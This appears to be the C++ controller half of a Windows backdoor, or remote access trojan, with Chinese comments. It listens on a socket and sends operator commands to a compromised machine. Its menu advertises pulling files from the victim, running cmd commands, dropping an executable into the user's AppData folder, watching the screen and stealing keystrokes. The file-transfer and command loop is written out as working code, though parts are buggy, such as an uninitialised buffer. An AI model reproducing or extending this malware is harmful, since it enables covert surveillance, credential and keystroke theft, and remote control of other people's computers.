#include<winsock.h>
#include <iostream>
using namespace std;
SOCKET we_socket;     
sockaddr_in we_addr_info; //创建socket对象 
void initialization() {
	WSADATA wsd;         //定义WSADATA对象
	WSAStartup(MAKEWORD(2, 2), &wsd);
	we_addr_info.sin_family = AF_INET;             //设置服务器地址家族
	we_addr_info.sin_port = htons(6369);           //设置服务器端口号
	we_addr_info.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	int len = sizeof(we_addr_info);
	we_socket = socket(AF_INET, SOCK_STREAM, 0);
	int i = ::bind(we_socket, (sockaddr*)&we_addr_info, len);    //把名字和套接字绑定
	if (i!=0){
		printf("WSAStartup failed: %d\n", WSAGetLastError());
	}
	listen(we_socket, 0);
	we_socket=accept(we_socket, (sockaddr*)&we_socket, &len); 
	if (we_socket>0){
		std::cout<<"new connect:"<<inet_ntoa(we_addr_info.sin_addr)<<std::endl;
	}
}
bool recvFile(SOCKET s){
	long bufSize = 10*1024;	//缓冲区大小
	char* buffer;	//缓冲区保存文件数据
	if (buffer == NULL)
	{
		buffer = new char[bufSize];
		if (!buffer)
			return false;
	}
	char *fileName=(char*)"C:\\Users\\Administrator\\Desktop\\recv_file_back.door";
	FILE* write = fopen(fileName, "wb");
	int nCount;
	do{
		nCount = recv(s, buffer, bufSize, 0);
		fwrite(buffer,nCount, 1, write);
	}while(nCount>=bufSize);//如果不成立就退出

	fclose(write);
	send(we_socket, "ok", 4, 0);
	std::cout << "save file success! Filename-------->"<<fileName << std::endl;
	return true;
}
bool uploadFile(SOCKET s, char* fileName){
	char upload_file_name[128]={0};
	if(fileName[0]=*"$"){
		for(int i=0;i<sizeof((std::string)fileName)+2;i++)
		{upload_file_name[i]=fileName[i+1];}
		std::cout<<"upload file>>>>>"<<upload_file_name<<std::endl;
	}
	long bufSize = 10*1024;	//缓冲区大小
	char* buffer;	//缓冲区保存文件数据
	FILE* read = fopen(upload_file_name, "rb");
	fseek(read, 0, SEEK_END);	//将文件位置指针移动到最后
	bufSize = ftell(read);	//ftell(FILE *stream)：返回给定流stream的当前文件位置，获取当前位置相对文件首的位移，位移值等于文件所含字节数
	fseek(read, 0, SEEK_SET);	//将文件位置指针移动到开头
	std::cout<<"filesize:"<<bufSize<<std::endl;
	buffer= new char[bufSize];
	std::cout << sizeof(buffer) << std::endl;
	int nCount;
	int ret = 0;
	while ((nCount = fread(buffer, 1, bufSize, read)) > 0)	//循环读取文件进行传送
	{ret += send(s, buffer, nCount, 0);}
	fclose(read);
	std::cout << "send file success!"<<" Byte:"<<ret << std::endl;
	return true;
}
int main(){
		cout<<"·····$xx.png--->下载xx.png，需要绝对路径"<<endl;
		cout<<"·····@whoami--->执行cmd命令whoami"<<endl;
		cout<<"·····#xx.exe--->上传xx.exe到用户目录AppData\\Local\\xx.exe"<<endl;
		cout<<"·····EYE------->窥屏"<<endl;
		cout<<"·····KEY------->键盘窃取"<<endl;
		cout<<"·····&249------>弹窗：249"<<endl;
		char recv_msg[1024],send_msg[1024];
		initialization();
		while (1){
			memset(recv_msg, 0, sizeof(recv_msg));
			memset(send_msg, 0, sizeof(send_msg));
			std::cout<<"          input***";
			std::cin.getline(send_msg,65);
			send(we_socket, send_msg, sizeof(send_msg), 0);
			if(send_msg[0]==*"$"){recvFile(we_socket);}
			if(send_msg[0]==*"#"){uploadFile(we_socket,send_msg);}
			recv(we_socket, recv_msg, sizeof(recv_msg), 0); 
			printf("[recv_msg]-->%s\n",recv_msg);
			}
		closesocket(we_socket);
		WSACleanup();
	
	return 0;
}
//if (!strcmp(send_msg, "exit"))                     
//如果输入的是exit则断开连接 $G:\github_clone\FL\c++door\1.jpg
//#G:\github_clone\FL\c++door\1.jpg

